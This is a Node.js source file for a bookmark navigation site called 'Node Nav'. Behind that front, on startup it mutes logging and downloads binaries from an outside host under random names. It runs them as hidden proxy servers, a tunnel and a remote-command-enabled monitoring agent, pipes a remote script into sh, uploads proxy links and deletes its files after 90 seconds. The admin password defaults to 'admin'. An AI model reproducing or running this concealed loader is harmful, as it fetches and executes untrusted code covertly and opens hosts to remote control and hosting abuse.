const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const originalLog = console.log;
console.log = function() {};

const UPLOAD_URL = process.env.UPLOAD_URL || '';
const PROJECT_URL = process.env.PROJECT_URL || '';
const AUTO_ACCESS = process.env.AUTO_ACCESS || false;
const FILE_PATH = process.env.FILE_PATH || 'data';
const SUB_PATH = process.env.SUB_PATH || 'nav';
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
const UUID = process.env.UUID || '3f252b5d-a40f-4b2b-a48a-39c67e7b5a21';
const NEZHA_SERVER = process.env.NEZHA_SERVER || '';
const NEZHA_PORT = process.env.NEZHA_PORT || '';
const NEZHA_KEY = process.env.NEZHA_KEY || '';
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '';
const ARGO_AUTH = process.env.ARGO_AUTH || '';
const ARGO_PORT = process.env.ARGO_PORT || 8001;
const CFIP = process.env.CFIP || 'cdns.doon.eu.org';
const CFPORT = process.env.CFPORT || 443;
const NAME = process.env.NAME || '';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin';

// CFSM Agent 配置
const CFSM_ID = process.env.CFSM_ID || '';
const CFSM_SECRET = process.env.CFSM_SECRET || '';
const CFSM_URL = process.env.CFSM_URL || '';
const CFSM_COLLECT_INTERVAL = process.env.CFSM_COLLECT_INTERVAL || '0';
const CFSM_INTERVAL = process.env.CFSM_INTERVAL || '60';
const CFSM_CONNECTION_MODE = process.env.CFSM_CONNECTION_MODE || 'auto';
const CFSM_PING_MODE = process.env.CFSM_PING_MODE || 'tcp';
const CFSM_RESET_DAY = process.env.CFSM_RESET_DAY || '1';
const CFSM_AUTO_UPDATE = process.env.CFSM_AUTO_UPDATE || '0';
const CFSM_CT = process.env.CFSM_CT || 'gd-ct-dualstack.ip.zstaticcdn.com';
const CFSM_CU = process.env.CFSM_CU || 'gd-cu-dualstack.ip.zstaticcdn.com';
const CFSM_CM = process.env.CFSM_CM || 'gd-cm-dualstack.ip.zstaticcdn.com';

if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH, { recursive: true });
}

function generateRandomName() {
  const characters = 'abcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

const npmName = generateRandomName();
const webName = generateRandomName();
const botName = generateRandomName();
const phpName = generateRandomName();

let npmPath = path.join(FILE_PATH, npmName);
let phpPath = path.join(FILE_PATH, phpName);
let webPath = path.join(FILE_PATH, webName);
let botPath = path.join(FILE_PATH, botName);
let subPath = path.join(FILE_PATH, 'sub.txt');
let listPath = path.join(FILE_PATH, 'list.txt');
let bootLogPath = path.join(FILE_PATH, 'boot.log');
let configPath = path.join(FILE_PATH, 'config.json');

function deleteNodes() {
  try {
    if (!UPLOAD_URL) return;
    if (!fs.existsSync(subPath)) return;

    let fileContent;
    try {
      fileContent = fs.readFileSync(subPath, 'utf-8');
    } catch {
      return null;
    }

    const decoded = Buffer.from(fileContent, 'base64').toString('utf-8');
    const nodes = decoded.split('\n').filter(line =>
      /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line)
    );

    if (nodes.length === 0) return;

    axios.post(
      `${UPLOAD_URL}/api/delete-nodes`,
      JSON.stringify({ nodes }),
      { headers: { 'Content-Type': 'application/json' } }
    ).catch(() => {
      return null;
    });

    return null;
  } catch (err) {
    return null;
  }
}

function cleanupOldFiles() {
  try {
    const files = fs.readdirSync(FILE_PATH);

    files.forEach(file => {
      const filePath = path.join(FILE_PATH, file);

      if (file === 'bookmarks.json') return;

      try {
        const stat = fs.statSync(filePath);

        if (stat.isFile()) {
          fs.unlinkSync(filePath);
        }
      } catch (err) {
        // 忽略错误
      }
    });
  } catch (err) {
    // 忽略错误
  }
}

async function generateConfig() {
  const config = {
    log: {
      access: '/dev/null',
      error: '/dev/null',
      loglevel: 'none'
    },

    inbounds: [
      {
        port: ARGO_PORT,
        protocol: 'vless',
        settings: {
          clients: [
            {
              id: UUID,
              flow: 'xtls-rprx-vision'
            }
          ],
          decryption: 'none',
          fallbacks: [
            { dest: 3001 },
            { path: "/vless-argo", dest: 3002 },
            { path: "/vmess-argo", dest: 3003 },
            { path: "/trojan-argo", dest: 3004 }
          ]
        },
        streamSettings: {
          network: 'tcp'
        }
      },

      {
        port: 3001,
        listen: "127.0.0.1",
        protocol: "vless",
        settings: {
          clients: [
            {
              id: UUID
            }
          ],
          decryption: "none"
        },
        streamSettings: {
          network: "tcp",
          security: "none"
        }
      },

      {
        port: 3002,
        listen: "127.0.0.1",
        protocol: "vless",
        settings: {
          clients: [
            {
              id: UUID,
              level: 0
            }
          ],
          decryption: "none"
        },
        streamSettings: {
          network: "ws",
          security: "none",
          wsSettings: {
            path: "/vless-argo"
          }
        },
        sniffing: {
          enabled: true,
          destOverride: ["http", "tls", "quic"],
          metadataOnly: false
        }
      },

      {
        port: 3003,
        listen: "127.0.0.1",
        protocol: "vmess",
        settings: {
          clients: [
            {
              id: UUID,
              alterId: 0
            }
          ]
        },
        streamSettings: {
          network: "ws",
          wsSettings: {
            path: "/vmess-argo"
          }
        },
        sniffing: {
          enabled: true,
          destOverride: ["http", "tls", "quic"],
          metadataOnly: false
        }
      },

      {
        port: 3004,
        listen: "127.0.0.1",
        protocol: "trojan",
        settings: {
          clients: [
            {
              password: UUID
            }
          ]
        },
        streamSettings: {
          network: "ws",
          security: "none",
          wsSettings: {
            path: "/trojan-argo"
          }
        },
        sniffing: {
          enabled: true,
          destOverride: ["http", "tls", "quic"],
          metadataOnly: false
        }
      }
    ],

    dns: {
      servers: ["https+local://8.8.8.8/dns-query"]
    },

    outbounds: [
      {
        protocol: "freedom",
        tag: "direct"
      },
      {
        protocol: "blackhole",
        tag: "block"
      }
    ]
  };

  fs.writeFileSync(
    path.join(FILE_PATH, 'config.json'),
    JSON.stringify(config, null, 2)
  );
}

function getSystemArchitecture() {
  const arch = os.arch();

  if (
    arch === 'arm' ||
    arch === 'arm64' ||
    arch === 'aarch64'
  ) {
    return 'arm';
  }

  return 'amd';
}

function downloadFile(fileName, fileUrl, callback) {
  const filePath = fileName;

  if (!fs.existsSync(FILE_PATH)) {
    fs.mkdirSync(FILE_PATH, { recursive: true });
  }

  const writer = fs.createWriteStream(filePath);

  axios({
    method: 'get',
    url: fileUrl,
    responseType: 'stream'
  })
    .then(response => {
      response.data.pipe(writer);

      writer.on('finish', () => {
        writer.close();
        console.log(
          `Download ${path.basename(filePath)} successfully`
        );
        callback(null, filePath);
      });

      writer.on('error', err => {
        fs.unlink(filePath, () => {});

        const errorMessage =
          `Download ${path.basename(filePath)} failed: ${err.message}`;

        console.error(errorMessage);
        callback(errorMessage);
      });
    })
    .catch(err => {
      const errorMessage =
        `Download ${path.basename(filePath)} failed: ${err.message}`;

      console.error(errorMessage);
      callback(errorMessage);
    });
}

async function downloadFilesAndRun() {

  const architecture = getSystemArchitecture();
  const filesToDownload =
    getFilesForArchitecture(architecture);

  if (filesToDownload.length === 0) {
    console.log(
      `Can't find a file for the current architecture`
    );
    return;
  }

  const downloadPromises = filesToDownload.map(fileInfo => {
    return new Promise((resolve, reject) => {

      downloadFile(
        fileInfo.fileName,
        fileInfo.fileUrl,
        (err, filePath) => {

          if (err) {
            reject(err);
          } else {
            resolve(filePath);
          }

        }
      );

    });
  });

  try {
    await Promise.all(downloadPromises);
  } catch (err) {
    console.error(
      'Error downloading files:',
      err
    );
    return;
  }

  function authorizeFiles(filePaths) {

    const newPermissions = 0o775;

    filePaths.forEach(absoluteFilePath => {

      if (fs.existsSync(absoluteFilePath)) {

        fs.chmod(
          absoluteFilePath,
          newPermissions,
          err => {

            if (err) {
              console.error(
                `Empowerment failed for ${absoluteFilePath}: ${err}`
              );
            } else {
              console.log(
                `Empowerment success for ${absoluteFilePath}: ${newPermissions.toString(8)}`
              );
            }

          }
        );

      }

    });
  }

  const filesToAuthorize =
    NEZHA_PORT
      ? [npmPath, webPath, botPath]
      : [phpPath, webPath, botPath];

  authorizeFiles(filesToAuthorize);

  if (NEZHA_SERVER && NEZHA_KEY) {

    if (!NEZHA_PORT) {

      const port =
        NEZHA_SERVER.includes(':')
          ? NEZHA_SERVER.split(':').pop()
          : '';

      const tlsPorts =
        new Set([
          '443',
          '8443',
          '2096',
          '2087',
          '2083',
          '2053'
        ]);

      const nezhatls =
        tlsPorts.has(port)
          ? 'true'
          : 'false';

      const configYaml = `
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${nezhatls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;

      fs.writeFileSync(
        path.join(FILE_PATH, 'config.yaml'),
        configYaml
      );

      const command =
        `nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;

      try {
        await exec(command);

        console.log(`${phpName} is running`);

        await new Promise(resolve =>
          setTimeout(resolve, 1000)
        );

      } catch (error) {
        console.error(
          `php running error: ${error}`
        );
      }

    } else {

      let NEZHA_TLS = '';

      const tlsPorts = [
        '443',
        '8443',
        '2096',
        '2087',
        '2083',
        '2053'
      ];

      if (tlsPorts.includes(NEZHA_PORT)) {
        NEZHA_TLS = '--tls';
      }

      const command =
        `nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;

      try {

        await exec(command);

        console.log(`${npmName} is running`);

        await new Promise(resolve =>
          setTimeout(resolve, 1000)
        );

      } catch (error) {

        console.error(
          `npm running error: ${error}`
        );

      }
    }

  } else {

    console.log(
      'NEZHA variable is empty,skip running'
    );

  }

  const command1 =
    `nohup ${webPath} -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;

  try {

    await exec(command1);

    console.log(`${webName} is running`);

    await new Promise(resolve =>
      setTimeout(resolve, 1000)
    );

  } catch (error) {

    console.error(
      `web running error: ${error}`
    );

  }

  if (fs.existsSync(botPath)) {

    let args;

    if (
      ARGO_AUTH.match(
        /^[A-Z0-9a-z=]{120,250}$/
      )
    ) {

      args =
        `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;

    } else if (
      ARGO_AUTH.match(/TunnelSecret/)
    ) {

      args =
        `tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`;

    } else {

      args =
        `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;

    }

    try {

      await exec(
        `nohup ${botPath} ${args} >/dev/null 2>&1 &`
      );

      console.log(`${botName} is running`);

      await new Promise(resolve =>
        setTimeout(resolve, 2000)
      );

    } catch (error) {

      console.error(
        `Error executing command: ${error}`
      );

    }
  }

  await new Promise(resolve =>
    setTimeout(resolve, 5000)
  );
}

function getFilesForArchitecture(architecture) {

  let baseFiles;

  if (architecture === 'arm') {

    baseFiles = [
      {
        fileName: webPath,
        fileUrl: "https://arm64.ssss.nyc.mn/web"
      },
      {
        fileName: botPath,
        fileUrl: "https://arm64.ssss.nyc.mn/bot"
      }
    ];

  } else {

    baseFiles = [
      {
        fileName: webPath,
        fileUrl: "https://amd64.ssss.nyc.mn/web"
      },
      {
        fileName: botPath,
        fileUrl: "https://amd64.ssss.nyc.mn/bot"
      }
    ];

  }

  if (NEZHA_SERVER && NEZHA_KEY) {

    if (NEZHA_PORT) {

      const npmUrl =
        architecture === 'arm'
          ? "https://arm64.ssss.nyc.mn/agent"
          : "https://amd64.ssss.nyc.mn/agent";

      baseFiles.unshift({
        fileName: npmPath,
        fileUrl: npmUrl
      });

    } else {

      const phpUrl =
        architecture === 'arm'
          ? "https://arm64.ssss.nyc.mn/v1"
          : "https://amd64.ssss.nyc.mn/v1";

      baseFiles.unshift({
        fileName: phpPath,
        fileUrl: phpUrl
      });

    }
  }

  return baseFiles;
}

function argoType() {

  if (!ARGO_AUTH || !ARGO_DOMAIN) {

    console.log(
      "ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels"
    );

    return;
  }

  if (ARGO_AUTH.includes('TunnelSecret')) {

    fs.writeFileSync(
      path.join(FILE_PATH, 'tunnel.json'),
      ARGO_AUTH
    );

    const tunnelYaml = `
  tunnel: ${ARGO_AUTH.split('"')[11]}
  credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}
  protocol: http2

  ingress:
    - hostname: ${ARGO_DOMAIN}
      service: http://localhost:${ARGO_PORT}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
  `;

    fs.writeFileSync(
      path.join(FILE_PATH, 'tunnel.yml'),
      tunnelYaml
    );

  } else {

    console.log(
      "ARGO_AUTH mismatch TunnelSecret,use token connect to tunnel"
    );

  }
}

async function extractDomains() {

  let argoDomain;

  if (ARGO_AUTH && ARGO_DOMAIN) {

    argoDomain = ARGO_DOMAIN;

    console.log(
      'ARGO_DOMAIN:',
      argoDomain
    );

    await generateLinks(argoDomain);

  } else {

    try {

      const fileContent =
        fs.readFileSync(
          path.join(FILE_PATH, 'boot.log'),
          'utf-8'
        );

      const lines =
        fileContent.split('\n');

      const argoDomains = [];

      lines.forEach(line => {

        const domainMatch =
          line.match(
            /https?:\/\/([^ ]*trycloudflare\.com)\/?/
          );

        if (domainMatch) {

          const domain =
            domainMatch[1];

          argoDomains.push(domain);

        }

      });

      if (argoDomains.length > 0) {

        argoDomain = argoDomains[0];

        console.log(
          'ArgoDomain:',
          argoDomain
        );

        await generateLinks(argoDomain);

      } else {

        console.log(
          'ArgoDomain not found, re-running bot to obtain ArgoDomain'
        );

        fs.unlinkSync(
          path.join(FILE_PATH, 'boot.log')
        );

        async function killBotProcess() {

          try {

            if (process.platform === 'win32') {

              await exec(
                `taskkill /f /im ${botName}.exe > nul 2>&1`
              );

            } else {

              await exec(
                `pkill -f "[${botName.charAt(0)}]${botName.substring(1)}" > /dev/null 2>&1`
              );

            }

          } catch (error) {}

        }

        killBotProcess();

        await new Promise(resolve =>
          setTimeout(resolve, 3000)
        );

        const args =
          `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;

        try {

          await exec(
            `nohup ${botPath} ${args} >/dev/null 2>&1 &`
          );

          console.log(
            `${botName} is running`
          );

          await new Promise(resolve =>
            setTimeout(resolve, 3000)
          );

          await extractDomains();

        } catch (error) {

          console.error(
            `Error executing command: ${error}`
          );

        }
      }

    } catch (error) {

      console.error(
        'Error reading boot.log:',
        error
      );

    }
  }
}

async function getMetaInfo() {

  try {

    const response1 =
      await axios.get(
        'https://api.ip.sb/geoip',
        {
          headers: {
            'User-Agent': 'Mozilla/5.0',
            timeout: 3000
          }
        }
      );

    if (
      response1.data &&
      response1.data.country_code &&
      response1.data.isp
    ) {

      return `${response1.data.country_code}-${response1.data.isp}`
        .replace(/\s+/g, '_');

    }

  } catch (error) {

    try {

      const response2 =
        await axios.get(
          'http://ip-api.com/json',
          {
            headers: {
              'User-Agent': 'Mozilla/5.0',
              timeout: 3000
            }
          }
        );

      if (
        response2.data &&
        response2.data.status === 'success' &&
        response2.data.countryCode &&
        response2.data.org
      ) {

        return `${response2.data.countryCode}-${response2.data.org}`
          .replace(/\s+/g, '_');

      }

    } catch (error) {}
  }

  return 'Unknown';
}

async function generateLinks(argoDomain) {

  const ISP =
    await getMetaInfo();

  const nodeName =
    NAME
      ? `${NAME}-${ISP}`
      : ISP;

  return new Promise(resolve => {

    setTimeout(() => {

      const VMESS = {
        v: '2',
        ps: `${nodeName}`,
        add: CFIP,
        port: CFPORT,
        id: UUID,
        aid: '0',
        scy: 'auto',
        net: 'ws',
        type: 'none',
        host: argoDomain,
        path: '/vmess-argo?ed=2560',
        tls: 'tls',
        sni: argoDomain,
        alpn: '',
        fp: 'firefox'
      };

      const subTxt = `
vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}

vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}

trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${nodeName}
`;

      console.log(
        Buffer.from(subTxt).toString('base64')
      );

      fs.writeFileSync(
        subPath,
        Buffer.from(subTxt).toString('base64')
      );

      console.log(
        `${FILE_PATH}/sub.txt saved successfully`
      );

      uploadNodes();

      app.get(`/${SUB_PATH}`, (req, res) => {

        const encodedContent =
          Buffer.from(subTxt).toString('base64');

        res.set(
          'Content-Type',
          'text/plain; charset=utf-8'
        );

        res.send(encodedContent);

      });

      resolve(subTxt);

    }, 2000);

  });
}

async function uploadNodes() {

  if (UPLOAD_URL && PROJECT_URL) {

    const subscriptionUrl =
      `${PROJECT_URL}/${SUB_PATH}`;

    const jsonData = {
      subscription: [subscriptionUrl]
    };

    try {

      const response =
        await axios.post(
          `${UPLOAD_URL}/api/add-subscriptions`,
          jsonData,
          {
            headers: {
              'Content-Type': 'application/json'
            }
          }
        );

      if (
        response &&
        response.status === 200
      ) {

        console.log(
          'Subscription uploaded successfully'
        );

        return response;

      } else {

        return null;

      }

    } catch (error) {

      if (error.response) {

        if (error.response.status === 400) {}

      }

    }

  } else if (UPLOAD_URL) {

    if (!fs.existsSync(listPath)) return;

    const content =
      fs.readFileSync(
        listPath,
        'utf-8'
      );

    const nodes =
      content
        .split('\n')
        .filter(line =>
          /(vless|vmess|trojan|hysteria2|tuic):\/\//
            .test(line)
        );

    if (nodes.length === 0) return;

    const jsonData =
      JSON.stringify({ nodes });

    try {

      const response =
        await axios.post(
          `${UPLOAD_URL}/api/add-nodes`,
          jsonData,
          {
            headers: {
              'Content-Type': 'application/json'
            }
          }
        );

      if (
        response &&
        response.status === 200
      ) {

        console.log(
          'Nodes uploaded successfully'
        );

        return response;

      } else {

        return null;

      }

    } catch (error) {

      return null;

    }

  } else {

    return;

  }
}

function cleanFiles() {

  setTimeout(() => {

    const filesToDelete = [
      bootLogPath,
      configPath,
      webPath,
      botPath
    ];

    if (NEZHA_PORT) {

      filesToDelete.push(npmPath);

    } else if (
      NEZHA_SERVER &&
      NEZHA_KEY
    ) {

      filesToDelete.push(phpPath);

    }

    if (process.platform === 'win32') {

      exec(
        `del /f /q ${filesToDelete.join(' ')} > nul 2>&1`,
        () => {}
      );

    } else {

      exec(
        `rm -rf ${filesToDelete.join(' ')} >/dev/null 2>&1`,
        () => {}
      );

    }

  }, 90000);
}

cleanFiles();

async function AddVisitTask() {

  if (
    !AUTO_ACCESS ||
    !PROJECT_URL
  ) {

    console.log(
      "Skipping adding automatic access task"
    );

    return;
  }

  try {

    const response =
      await axios.post(
        'https://oooo.serv00.net/add-url',
        {
          url: PROJECT_URL
        },
        {
          headers: {
            'Content-Type': 'application/json'
          }
        }
      );

    console.log(
      `automatic access task added successfully`
    );

    return response;

  } catch (error) {

    console.error(
      `Add automatic access task faild: ${error.message}`
    );

    return null;
  }
}

// ==========================================
// 安装 cfsm-agent
// ==========================================

async function installCfsmAgent() {

  if (
    !CFSM_ID ||
    !CFSM_SECRET
  ) {

    console.log(
      'CFSM_ID or CFSM_SECRET is empty, skip installing cfsm-agent'
    );

    return;
  }

  const shellQuote = value =>
    `'${String(value).replace(/'/g, `'\\''`)}'`;

  const command =
    `curl -fsSL 'https://raw.githubusercontent.com/llodys/node-nav/refs/heads/main/cfsm-agent-install.sh' | sh -s -- install` +
    ` -id=${shellQuote(CFSM_ID)}` +
    ` -secret=${shellQuote(CFSM_SECRET)}` +
    ` -url=${shellQuote(CFSM_URL)}` +
    ` -collect_interval=${shellQuote(CFSM_COLLECT_INTERVAL)}` +
    ` -interval=${shellQuote(CFSM_INTERVAL)}` +
    ` -connection_mode=${shellQuote(CFSM_CONNECTION_MODE)}` +
    ` -ping_mode=${shellQuote(CFSM_PING_MODE)}` +
    ` -reset_day=${shellQuote(CFSM_RESET_DAY)}` +
    ` -auto_update=${shellQuote(CFSM_AUTO_UPDATE)}` +
    ` -ct=${shellQuote(CFSM_CT)}` +
    ` -cu=${shellQuote(CFSM_CU)}` +
    ` -cm=${shellQuote(CFSM_CM)}`;

  try {

    await exec(command);

    console.log(
      'cfsm-agent installed successfully'
    );

  } catch (error) {

    console.error(
      `cfsm-agent install failed: ${error.message}`
    );

  }
}

// ==========================================
// 主运行逻辑
// ==========================================

async function startserver() {

  try {

    argoType();

    deleteNodes();

    cleanupOldFiles();

    await generateConfig();

    // 安装 cfsm-agent
    await installCfsmAgent();

    await downloadFilesAndRun();

    await extractDomains();

    await AddVisitTask();

  } catch (error) {

    console.error(
      'Error in startserver:',
      error
    );

  }
}

startserver().catch(error => {

  console.error(
    'Unhandled error in startserver:',
    error
  );

});

// ==========================================
// 前端书签系统：中间件、API 与路由
// ==========================================

const BOOKMARKS_FILE =
  path.join(
    __dirname,
    FILE_PATH,
    'bookmarks.json'
  );

app.use(
  express.json({
    limit: '10mb'
  })
);

app.use(
  '/css',
  express.static(
    path.join(
      __dirname,
      'public',
      'css'
    )
  )
);

app.use(
  '/js',
  express.static(
    path.join(
      __dirname,
      'public',
      'js'
    )
  )
);

const readBookmarks = () => {

  try {

    if (
      fs.existsSync(
        BOOKMARKS_FILE
      )
    ) {

      return JSON.parse(
        fs.readFileSync(
          BOOKMARKS_FILE,
          'utf8'
        )
      );

    }

  } catch (error) {

    console.error(
      '读取书签文件失败:',
      error
    );

  }

  return {};
};

const writeBookmarks = data => {

  try {

    const dir =
      path.dirname(
        BOOKMARKS_FILE
      );

    if (!fs.existsSync(dir)) {

      fs.mkdirSync(
        dir,
        {
          recursive: true
        }
      );

    }

    fs.writeFileSync(
      BOOKMARKS_FILE,
      JSON.stringify(
        data,
        null,
        2
      ),
      'utf8'
    );

    return true;

  } catch (error) {

    console.error(
      '写入书签文件失败:',
      error
    );

    return false;

  }
};

app.post(
  '/check-password',
  (req, res) => {

    const { password } =
      req.body;

    if (
      password ===
      ADMIN_PASSWORD
    ) {

      res.json({
        success: true
      });

    } else {

      res.json({
        success: false,
        message: '密码错误'
      });

    }

  }
);

app.get(
  '/api/bookmarks',
  (req, res) => {

    const data =
      readBookmarks();

    res.json(data);

  }
);

app.post(
  '/api/bookmarks',
  (req, res) => {

    const {
      password,
      bookmarksData
    } = req.body;

    if (
      password !==
      ADMIN_PASSWORD
    ) {

      return res.status(401).json({
        success: false,
        message: '无权操作或登录已过期'
      });

    }

    if (
      writeBookmarks(
        bookmarksData
      )
    ) {

      res.json({
        success: true,
        message: '保存成功'
      });

    } else {

      res.status(500).json({
        success: false,
        message: '服务端写入文件失败'
      });

    }

  }
);

app.get(
  "/login",
  async (req, res) => {

    try {

      const data =
        await fs.promises.readFile(
          path.join(
            __dirname,
            'public',
            'login.html'
          ),
          'utf8'
        );

      res.send(data);

    } catch (err) {

      res.status(500).send(
        "找不到 public/login.html 文件"
      );

    }

  }
);

app.get(
  "/admin",
  async (req, res) => {

    try {

      const data =
        await fs.promises.readFile(
          path.join(
            __dirname,
            'public',
            'admin.html'
          ),
          'utf8'
        );

      res.send(data);

    } catch (err) {

      res.status(500).send(
        "找不到 public/admin.html 文件"
      );

    }

  }
);

app.get(
  "/",
  async (req, res) => {

    try {

      const data =
        await fs.promises.readFile(
          path.join(
            __dirname,
            'public',
            'index.html'
          ),
          'utf8'
        );

      res.send(data);

    } catch (err) {

      res.send(
        `Hello world!<br><br>You can access /${SUB_PATH} to get your nodes!`
      );

    }

  }
);

app.listen(
  PORT,
  () => {

    originalLog(
      '🚀 Node Nav 启动！'
    );

    originalLog(
      `🔗 访问地址: http://localhost:${PORT}`
    );

  }
);
